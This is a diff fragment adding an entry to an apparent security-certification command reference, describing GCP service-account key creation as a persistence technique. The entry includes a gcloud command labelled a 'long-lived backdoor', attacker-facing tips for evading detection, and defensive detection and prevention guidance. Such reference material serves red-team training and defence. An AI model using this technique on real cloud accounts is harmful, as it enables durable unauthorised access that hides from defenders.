+      "notes": "Why it's strong persistence: an SA key is a self-contained bearer credential - no MFA, no interactive login, valid until explicitly deleted (default keys don't expire). If you can create a key on a privileged SA (or one you escalated to), you keep its access indefinitely. Related: add a key by uploading your own public key, or grant yourself iam.serviceAccountTokenCreator for token-based (keyless, quieter) persistence. Defenders can enumerate keys with 'keys list' - your key shows a creation date, so it's detectable. Prefer impersonation for stealth; use key creation when you need durable offline access.",
+      "references": [
+        {
+          "title": "CyberWarFare Labs - MCRTA",
+          "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+        },
+        {
+          "title": "Google Cloud - Managing service account keys",
+          "url": "https://cloud.google.com/iam/docs/keys-create-delete"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-iam-privesc",
+          "rel": "prereq",
+          "note": "Escalate to a privileged SA first, then persist"
+        },
+        {
+          "id": "gcp-authentication",
+          "rel": "next",
+          "note": "Activate the new key to regain access"
+        }
+      ],
+      "opsec": "loud",
+      "exam": "exam-ok",
+      "mitre": [
+        "T1098.001"
+      ],
+      "defense": {
+        "why_it_works": "A principal with iam.serviceAccountKeys.create can mint a new long-lived JSON key for a service account. The key authenticates non-interactively as the SA with no MFA and no expiry by default, so it persists independently of the compromised user and the original access path.",
+        "prerequisites": "iam.serviceAccountKeys.create on a target SA (via Editor/Owner, Service Account Key Admin, or a custom role) - often obtained after escalation.",
+        "impact": "T1098.001 Account Manipulation: Additional Cloud Credentials. Durable, MFA-independent access as the service account at its privilege - persistence and (if the SA is privileged) standing escalation.",
+        "detection": "Cloud Audit Logs: google.iam.admin.v1.CreateServiceAccountKey events, especially on privileged SAs or from unexpected principals. Periodic review of 'keys list' for unknown keys. SCC key-age/anomaly findings.",
+        "artifacts": "Audit Log CreateServiceAccountKey entries; new user-managed keys under the SA; the downloaded key.json.",
+        "prevention": "Disable SA key creation org-wide (constraints/iam.disableServiceAccountKeyCreation) and use Workload Identity Federation / impersonation instead. Restrict Service Account Key Admin. Alert on CreateServiceAccountKey. Rotate and expire keys; inventory keys regularly.",
+        "evasion": "Prefer token impersonation (no key artifact) where possible; name/time the key to blend with legitimate automation; delete after use if only short-term access is needed.",
+        "sources": [
+          "MCRTA GCP",
+          "https://attack.mitre.org/techniques/T1098/001/"
+        ],
+        "misconfiguration": "SA key creation allowed (no org policy) and key-create permission granted broadly; privileged SAs whose keys anyone with Editor can mint.",
+        "vulnerable_config": "# Any Editor on the project can mint a key for a privileged SA:\ngcloud iam service-accounts keys create bd.json --iam-account <priv_sa>   # long-lived backdoor",
+        "secure_config": "# Org policy: constraints/iam.disableServiceAccountKeyCreation = true\n# Use Workload Identity Federation / short-lived impersonation; restrict Key Admin;\n# alert on CreateServiceAccountKey; inventory + rotate keys."
+      }
+    },
+    {
       "id": "cdsa-get-winevent",
       "name": "Get-WinEvent - PowerShell Event Log Analysis",
       "command": "Get-WinEvent -FilterHashtable @{LogName='<log>'; ID=<id>} | Select-Object TimeCreated, Id, Message | Format-List",
@@ -92882,8 +93544,8 @@ const COMMAND_DATA = {
       ]
     }
   ],
-  "totalCommands": 924,
-  "buildDate": "2026-09-09T12:57:41.168Z",
+  "totalCommands": 931,
+  "buildDate": "2026-09-09T13:06:11.108Z",
   "certifications": [
     "CDSA",
     "CPTS",
